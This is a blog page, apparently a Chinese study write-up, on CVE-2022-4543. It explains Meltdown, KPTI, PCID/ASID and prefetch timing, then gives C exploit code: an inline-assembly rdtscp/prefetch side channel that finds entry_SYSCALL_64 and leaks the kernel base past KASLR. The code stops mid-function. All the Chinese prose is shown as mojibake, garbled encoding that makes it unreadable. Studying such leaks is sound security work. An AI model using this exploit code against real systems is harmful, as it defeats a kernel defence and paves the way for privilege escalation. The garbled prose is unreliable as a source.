<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æˆ‘çš„åšå®¢">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="æˆ‘çš„åšå®¢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/08/CVE-2022-4543%E5%8F%8Akpti%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/08/CVE-2022-4543%E5%8F%8Akpti%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">CVE-2022-4543åŠkptiæœºåˆ¶</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-02-08 18:57:36 / ä¿®æ”¹æ—¶é—´ï¼š20:37:25" itemprop="dateCreated datePublished" datetime="2023-02-08T18:57:36+08:00">2023-02-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CVE-2022-4543åŠkptiæœºåˆ¶"><a href="#CVE-2022-4543åŠkptiæœºåˆ¶" class="headerlink" title="CVE-2022-4543åŠkptiæœºåˆ¶"></a>CVE-2022-4543åŠkptiæœºåˆ¶</h1><p>ç¿»è…¾è®¯ç„æ­¦å…¬ä¼—å·çœ‹åˆ°äº†è¿™ä¸ªcve-2022-4543ï¼Œä»¤æˆ‘è¿™ä¸ªèœé¸¡å¤§å—éœ‡æ’¼ã€‚</p>
<p>æ®æˆ‘äº†è§£kptiæœ‰ä¸€éƒ¨åˆ†å°±æ˜¯ä¸ºäº†ç¼“è§£kaslrçš„ä¾§ä¿¡é“æ”»å‡»å’Œå†…æ ¸é¡µè¡¨æ³„éœ²è€Œäº§ç”Ÿçš„æœºåˆ¶ï¼Œä½†æ˜¯è¿™ä¸ªcveå±…ç„¶é€šè¿‡kptiä¾§ä¿¡é“æ¥ç»•è¿‡kaslrğŸ¤£ï¼Œç¼“è§£äº†ä¸ªå¯‚å¯ã€‚</p>
<h2 id="Meltdownæ”»å‡»"><a href="#Meltdownæ”»å‡»" class="headerlink" title="Meltdownæ”»å‡»"></a>Meltdownæ”»å‡»</h2><p>Meltdownæ”»å‡»æ˜¯ä¸€ç§ç›´æ¥é’ˆå¯¹åº•å±‚ç¡¬ä»¶æœºåˆ¶ï¼ˆCPUçš„ä¹±åºæ‰§è¡Œæœºåˆ¶ã€Cacheæœºåˆ¶å’Œå¼‚å¸¸å¤„ç†æœºåˆ¶ï¼‰çš„æ—¶é—´ä¾§ä¿¡é“æ”»å‡»ï¼Œå®ƒçš„åŸºæœ¬åŸç†å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<img src="https://pic3.zhimg.com/80/v2-0b84759aa099951da430e0e8b7fd3e1a_720w.webp" alt="img" style="zoom:67%;" />

<p>è¿™é‡Œå¯¹ä¸Šå›¾åŠä¸Šè¿°æ¡ä»¶ä½œç®€å•è§£é‡Šï¼šä»é¡¶å±‚ç¨‹åºçš„è§’åº¦æ¥çœ‹ï¼ŒæŒ‡ä»¤Aã€Bå’ŒCåº”è¯¥æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œä¸”ç”±äºæŒ‡ä»¤Aè®¿é—®äº†éæ³•åœ°å€çš„æ•°æ®ä¼šè§¦å‘å¼‚å¸¸ï¼Œæ•…æŒ‡ä»¤Bå’ŒCçš„æ“ä½œä¸ä¼šè¢«æ‰§è¡Œï¼›ç„¶è€Œï¼Œä»åº•å±‚ç¡¬ä»¶çš„è§’åº¦æ¥çœ‹ï¼ŒæŒ‡ä»¤Aã€Bå’ŒCæ»¡è¶³ä¹±åºæ‰§è¡Œçš„æ¡ä»¶ï¼Œäºæ˜¯åœ¨ä¸‹ä¸€æŒ‡ä»¤æ‰€éœ€è¦çš„æ•°æ®å‡†å¤‡å®Œæˆåå°±å¯ä»¥ç«‹å³å¼€å§‹ä¸‹ä¸€æŒ‡ä»¤çš„æ‰§è¡Œã€‚åœ¨å›¾ä¸­æŒ‡ä»¤Açš„â€œé˜¶æ®µA_1â€ç»“æŸåï¼ŒæŒ‡ä»¤Bç”±äºæ‰€éœ€è¦çš„æ•°æ®å·²ç»å‡†å¤‡å®Œæˆæ•…å¯ç«‹å³å¼€å§‹æ‰§è¡Œï¼›åœ¨å›¾ä¸­æŒ‡ä»¤Bçš„â€œé˜¶æ®µB_1â€ç»“æŸåï¼ŒæŒ‡ä»¤Cç”±äºæ‰€éœ€è¦çš„æ•°æ®å·²ç»å‡†å¤‡å®Œæˆæ•…å¯ç«‹å³å¼€å§‹æ‰§è¡Œã€‚è‹¥â€œé˜¶æ®µA_2â€çš„æ‰§è¡Œæ—¶é—´å¤§äºâ€œé˜¶æ®µB_1â€çš„æ‰§è¡Œæ—¶é—´å’Œâ€œé˜¶æ®µC_1â€çš„æ‰§è¡Œæ—¶é—´ä¹‹å’Œï¼Œåˆ™éæ³•æ•°æ®èƒ½å¤Ÿç»è¿‡è¿ç®—äº§ç”Ÿåˆæ³•åœ°å€ï¼Œä¸”è¯¥åˆæ³•åœ°å€çš„æ•°æ®èƒ½å¤Ÿè¢«æ”¾å…¥L3_Cacheä¸­ï¼›è‹¥åœ¨æŒ‡ä»¤Açš„â€œé˜¶æ®µA_2â€ç»“æŸåï¼Œæ£€æŸ¥å‡ºéæ³•è®¿é—®æ‰€å¼•èµ·çš„å›æ»šå†²åˆ·ä¸å½±å“L3_Cacheï¼Œåˆ™ä¸éæ³•æ•°æ®ç›¸å…³çš„åˆæ³•æ•°æ®ä¾ç„¶å­˜åœ¨äºL3_Cacheä¸­ã€‚æœ€åï¼Œé€šè¿‡éå†è®¿é—®åˆæ³•åœ°å€çš„æ•°æ®ï¼Œå¹¶å¯¹è®¿é—®æ—¶é—´è¿›è¡Œè®¡æ—¶ï¼Œèƒ½å¤Ÿæ‰¾åˆ°æŸä¸ªè®¿é—®æ—¶é—´æ˜æ˜¾è¾ƒçŸ­çš„åˆæ³•æ•°æ®ï¼Œè¯¥æ•°æ®çš„åˆæ³•åœ°å€å³ä¸ºæŒ‡ä»¤Bä¸­ç”±éæ³•æ•°æ®ç»è¿‡è¿ç®—åæ‰€å¾—åˆ°çš„å€¼ï¼Œä»è€Œå¯ä»¥åæ¨å‡ºåŸéæ³•æ•°æ®ï¼Œäºæ˜¯é—´æ¥åœ°å¾—åˆ°äº†éæ³•åœ°å€ä¸­çš„æ•°æ®ã€‚</p>
<h2 id="kptiæœºåˆ¶"><a href="#kptiæœºåˆ¶" class="headerlink" title="kptiæœºåˆ¶"></a>kptiæœºåˆ¶</h2><p>ç®€è€Œè¨€ä¹‹ï¼Œåœ¨æ²¡æœ‰kptiä¹‹å‰ï¼Œå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´éƒ½æ˜¯å­˜åœ¨åŒä¸€ä¸ªé¡µè¡¨ä¸­ï¼Œè¿™æ ·åšçš„å¥½å¤„æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚æ•ˆç‡é«˜ï¼Œä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€çš„æ—¶å€™ä¸éœ€è¦åˆ‡æ¢é¡µè¡¨ï¼Œä½†ä¹Ÿå¸¦æ¥äº†å¾ˆå¤šé—®é¢˜ï¼Œæ¯”è¾ƒä¸¥é‡çš„é—®é¢˜å°±æ˜¯å†…æ ¸å’Œç”¨æˆ·æ€çš„éš”ç¦»å˜å¼±äº†ï¼Œå¯¼è‡´åœ¨ç”¨æˆ·æ€å°±èƒ½é€šè¿‡ä¾§ä¿¡é“ç­‰ä¸€ç³»åˆ—æ‰‹æ®µè·å¾—å†…æ ¸æ€çš„ä¸€äº›ä¿¡æ¯ï¼Œè¿›è€Œå¯¹å†…æ ¸è¿›è¡Œæ”»å‡»ï¼Œæ¯”è¾ƒè‘—åçš„å°±æ˜¯ç†”æ¯å’Œå¹½çµæ”»å‡»äº†(Meltdown &amp; Spectre)ã€‚</p>
<p>kptiä¸ºäº†è§£å†³è¿™ä¸€äº›ç³»åˆ—é—®é¢˜åº”è¿è€Œç”Ÿã€‚å®ƒä¸ºäº†åŠ å¼ºå†…æ ¸æ€å’Œç”¨æˆ·æ€çš„éš”ç¦»ï¼Œè®©ä»–ä»¬åˆ†åˆ«å¤„äºä¸åŒçš„é¡µè¡¨ä¹‹ä¸­ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://img-blog.csdnimg.cn/20210115200819768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿›ç¨‹é¡µè¡¨åˆ†å‰²æˆç”¨æˆ·æ€é¡µè¡¨å’Œå†…æ ¸æ€é¡µè¡¨çš„å…·ä½“æ–¹æ¡ˆæ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ</p>
<p>1ã€åœ¨è¿è¡Œuserapplication çš„æ—¶å€™ï¼Œå°†kernel mapping å‡å°‘åˆ°æœ€å°‘ï¼Œåªä¿ç•™å¿…é¡»çš„useråˆ°kernelçš„exception entry mapping(<strong>æ³¨æ„è¿™ä¸ªcveå°±æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‰¹æ€§</strong>). å…¶ä»–çš„kernel mapping åœ¨è¿è¡Œuser applicationæ—¶éƒ½å»æ‰,å˜æˆæ— æ•ˆmappingï¼Œè¿™æ ·çš„è¯ï¼Œå¦‚æœuserè®¿é—®kernel data, åœ¨MMUåœ°å€è½¬æ¢çš„æ—¶å€™å°±ä¼šè¢«æŒ¡æ‰ï¼ˆå› ä¸ºæ— æ•ˆmapping).<br>2ã€è®¾è®¡ä¸€ä¸ªtrampoline çš„kernel PGDç»™è¿è¡Œuseræ—¶ç”¨ã€‚Trampoline kernel mapping PGDåªåŒ…å«exception entryå¿…éœ€çš„mapping.<br>3ã€å½“useré€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ–æ˜¯timeræˆ–å…¶ä»–å¼‚å¸¸è¿›å…¥kernelæ˜¯é¦–å…ˆç”¨trampolineçš„mapping,æ¥ä¸‹æ¥tramponlineçš„vectorå¤„ç†ä¼šå°†kernel mapping æ¢æˆæ­£å¸¸çš„kernel mapping(SWAPPER_PGD_DIR), å¹¶ç›´æ¥è·³è½¬åˆ°kernelåŸæ¥çš„vector entry, ç»§ç»­æ­£å¸¸å¤„ç†ã€‚æˆ‘ä»¬æŠŠä¸Šè¿°è¿‡ç¨‹ç§°ä¹‹ä¸ºmap kernel mapping.<br>4ã€å½“ä»kernelè¿”å›åˆ°useræ—¶ï¼Œæ­£å¸¸çš„kernel_exitä¼šè°ƒç”¨trampolineçš„exitï¼Œtramp_exitä¼šé‡æ–°å°†kernel mapping æ¢æˆæ˜¯trampoline. è¿™ä¸ªè¿‡ç¨‹å«unmap kernel mapping.</p>
<p>è¿™ä¸ªè¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒç†Ÿæ‚‰çš„ï¼Œå’Œxv6çš„æ“ä½œç³»ç»Ÿçš„å®ç°åŸç†å¤§å·®ä¸å·®ã€‚</p>
<p>kptié™¤äº†ä¸Šè¿°ç‰¹æ€§ï¼Œè¿˜å¼•å…¥äº†pcid/asid,è¿™ä¸ªæˆ‘è®¤ä¸ºæ‰æ˜¯åŠ å¼ºéš”ç¦»æœ€é‡è¦çš„æªæ–½ï¼Œåœ¨æ²¡æœ‰pcid/asidä¹‹å‰tlbæ˜¯æ— æ³•åˆ†è¾¨ä¸åŒè¿›ç¨‹çš„é¡µè¡¨é¡¹çš„ï¼Œå› ä¸ºä»–ä»¬çš„è™šæ‹Ÿç©ºé—´éƒ½æ˜¯é‡å çš„ï¼Œæ‰€ä»¥åˆ‡æ¢è¿›ç¨‹çš„æ—¶å€™tlbå¿…é¡»å…¨éƒ¨åˆ·æ–°ï¼Œä½†è¿™ä¸ªæ•ˆç‡å¤ªä½äº†ï¼Œæ‰€æœ‰è¿›ç¨‹çš„å†…æ ¸ç©ºé—´æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥tlbå¼•å…¥äº†Global TLB<code>å’Œ</code>non-Global TLB,å†…æ ¸pteæ˜¯Global TLBï¼Œç”¨æˆ·æ€pteæ˜¯non-Globalï¼Œåˆ‡æ¢è¿›ç¨‹çš„æ—¶å€™åªéœ€è¦åˆ·æ–°non-Globalå°±è¡Œï¼Œè¿™æ ·tlbå°±ç›¸å½“äºåŠåˆ·æ–°äº†ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20210115200940339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å…¶å®pcid/asidå°±ç›¸å½“äºè¿›ç¨‹é¡µè¡¨æ ‡è¯†ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œæ—¶ï¼Œéƒ½ä¼šåŠ¨æ€åˆ†é…ä¸€ä¸ªpcid/asidï¼Œå¦‚æœè¿›ç¨‹åˆ‡æ¢åˆ°æœ¬è¿›ç¨‹å¼€å§‹è¿è¡Œï¼ŒæŠŠå¯¹åº”çš„pcid/asidé…ç½®åˆ°cr3ä¸­</p>
<p><img src="https://img-blog.csdnimg.cn/20210115201000929.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨è¿›ç¨‹è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ ¹æ®æœ¬è¿›ç¨‹çš„pgdäº§ç”Ÿçš„é¡µè¡¨è½¬æ¢å…³ç³»ä¼šç¼“å­˜åˆ°TLBä¸­ï¼Œæ‰€æœ‰äº§ç”Ÿçš„TLBæ¡ç›®ä¼šæ ¹æ®å½“å‰cr3ä¸­çš„pcid/asidæ‰“ä¸Šæ ‡ç­¾ã€‚TLBæ¡ç›®æœ‰äº†æ ‡ç­¾ä»¥åï¼Œé¡µè¡¨åˆ‡æ¢å°±ä¸éœ€è¦å»åˆ·æ–°æ—§çš„æ¡ç›®äº†ï¼Œå› ä¸ºå½“å‰cpuåªä¼šè®¤å’Œå½“å‰cr3ä¸­asidç›¸åŒçš„TLBæ¡ç›®ï¼Œè¿™æ ·TLBå°±ä¸ç”¨é¢‘ç¹çš„å»åˆ·æ–°ï¼Œä¸”ç›¸äº’ä¹‹é—´ä¹Ÿæ˜¯éš”ç¦»çš„ã€‚ä¸ºäº†åŒä¸€è¿›ç¨‹å†…çš„ç”¨æˆ·æ€é¡µè¡¨å’Œå†…æ ¸æ€é¡µè¡¨éš”ç¦»ï¼Œæ¯ä¸ªè¿›ç¨‹éœ€è¦ä¸¤ä¸ªasidã€‚ç”¨æœ€é«˜ä½bit11æ¥åŒºåˆ†ï¼Œbit11=0 ä¸ºå†…æ ¸æ€asidï¼Œbit11=1 ä¸ºç”¨æˆ·æ€asidã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20210412145123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œpcidå°±æ˜¯è¿›ç¨‹ä¹‹é—´åŒºåˆ†çš„æ ‡è¯†ï¼Œasidå°±æ˜¯åŒä¸€ä¸ªè¿›ç¨‹å†…æ ¸é¡µè¡¨å’Œç”¨æˆ·æ€é¡µè¡¨åŒºåˆ†çš„æ ‡è¯†ï¼Œè¿™æ ·å°±åœ¨tlbä¸­å½»åº•åŒºåˆ†äº†ä¸åŒè¿›ç¨‹çš„é¡µè¡¨é¡¹å’Œç»Ÿä¸€è¿›ç¨‹ä¸åŒæ€çš„é¡µè¡¨é¡¹ï¼Œåœ¨tlbå±‚é¢å®ç°äº†è¾ƒä¸ºå®Œç¾çš„éš”ç¦»ã€‚</p>
<p>åœ¨åˆ‡æ¢è¿›ç¨‹çš„æ—¶å€™åªéœ€è¦æ ¹æ®pcid/asidæŠŠè‡ªå·±çš„é¡µè¡¨é¡¹æ¸…é™¤å°±å¥½äº†ï¼Œä¸éœ€è¦å…¨åˆ·æ–°æˆ–è€…åŠåˆ·æ–°ã€‚</p>
<h2 id="cpué¢„å–æœºåˆ¶"><a href="#cpué¢„å–æœºåˆ¶" class="headerlink" title="cpué¢„å–æœºåˆ¶"></a>cpué¢„å–æœºåˆ¶</h2><p>x86_64æœ‰ä¸€ç»„é¢„å–æŒ‡ä»¤<code>prefetch</code>ï¼Œè¿™äº›æŒ‡ä»¤å¯ä»¥å°†æŒ‡å®šåœ°å€é¢„å–åˆ°cpu cacheä¸­ï¼Œå½“ç„¶è¿™ä¸ªåœ°å€ä¹Ÿä¼šè¢«åˆ·æ–°åˆ°å¿«è¡¨tlbä¸­ï¼Œå¦‚æœå°†è¦é¢„å–çš„åœ°å€å·²ç»å­˜åœ¨åœ¨tlsä¸­äº†ï¼ˆå°±æ˜¯ä¹‹å‰ä½¿ç”¨è¿‡è¿™ä¸ªåœ°å€ï¼‰ï¼Œé‚£ä¹ˆé¢„å–å°†ä¼šå¿«é€Ÿå®Œæˆï¼Œä½†æ˜¯å½“åœ°å€ä¸å­˜åœ¨çš„æ—¶å€™ï¼Œé¢„å–æŒ‡ä»¤å°†ä¼šå®Œæˆçš„æ¯”è¾ƒæ…¢ï¼Œè¿™å¾ˆå¥½ç†è§£ï¼Œå› ä¸ºä¹‹å‰æ²¡æœ‰è®¿é—®è¿‡ï¼Œæ‰€ä»¥åœ°å€å¯¹åº”çš„pteä¸åœ¨tlsä¸­ï¼Œæ‰€ä»¥è¿˜å¾—éå†é¡µè¡¨æ‰¾åˆ°ç‰©ç†åœ°å€ç„¶åæŠŠå¯¹åº”åœ°å€æ•°æ®æ‹·è´åˆ°cpu cache,ä¸­ï¼Œæ¯”ä¹‹å‰è€…å¤šäº†ä¸¤æ­¥æ“ä½œã€‚</p>
<h2 id="CVE-2022-4543æ”»å‡»æ€è·¯"><a href="#CVE-2022-4543æ”»å‡»æ€è·¯" class="headerlink" title="CVE-2022-4543æ”»å‡»æ€è·¯"></a>CVE-2022-4543æ”»å‡»æ€è·¯</h2><p>ä¸»è¦çš„æ¼æ´æˆå› æ˜¯åœ¨ç”¨æˆ·æ€é¡µè¡¨ä¸­æ˜ å°„äº†<code>entry_SYSCALL_64</code>å†…æ ¸ç©ºé—´ï¼Œè€Œä¸”å’Œå†…æ ¸æ€çš„æ˜ å°„å…³ç³»æ˜¯ç›¸åŒçš„ä¸”è¿™ä¸ªåœ°å€åˆ°å†…æ ¸æ€çš„åŸºåœ°å€çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åªè¦åœ¨ç”¨æˆ·æ€å¤šæ¬¡è¿›è¡Œç³»ç»Ÿè°ƒç”¨,å°±ä¼šåœ¨å†…æ ¸æ€å¤šæ¬¡æ‰§è¡Œ<code>entry_SYSCALL_64</code>å†…éƒ¨çš„ç›¸å…³å‡½æ•°ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´è¿™éƒ¨åˆ†åœ°å€è¿›å…¥tlbä¸”å¯¹åº”å†…å®¹ä¼šè¿›å…¥cpucacheä¸­ï¼Œè¿™æ ·æ­¤æ—¶tlbä¸­å…³äºå†…æ ¸æ€çš„åœ°å€åªæœ‰è¿™ä¸€ä¸ªï¼Œç„¶åå†ä½¿ç”¨é¢„å–æŒ‡ä»¤éå†æ‰€æœ‰çš„çš„å†…æ ¸ç©ºé—´ï¼Œæ‰¾åˆ°æ‰€éœ€æ—¶é—´æœ€çŸ­çš„é‚£ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯<code>entry_SYSCALL_64</code>çš„åœ°å€äº†ã€‚ç„¶åå†å‡å»å›ºå®šåç§»å°±å¾—åˆ°å†…æ ¸æ€åŸºåœ°å€äº†ã€‚</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_LOWER_BOUND 0xffffffff80000000ull</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_UPPER_BOUND 0xffffffffc0000000ull</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> entry_SYSCALL_64_offset 0xd00000ull</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">sidechannel</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> a, b, c, d;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;.intel_syntax noprefix;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;rdtscp;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %0, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %1, rdx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;xor rax, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;lfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;prefetchnta qword ptr [%4];&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;prefetcht2 qword ptr [%4];&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;xor rax, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;lfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;rdtscp;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %2, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %3, rdx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;.att_syntax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;=r&quot;</span> (a), <span class="string">&quot;=r&quot;</span> (b), <span class="string">&quot;=r&quot;</span> (c), <span class="string">&quot;=r&quot;</span> (d)</span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;r&quot;</span> (addr)</span></span></span><br><span class="line"><span class="params"><span class="function">  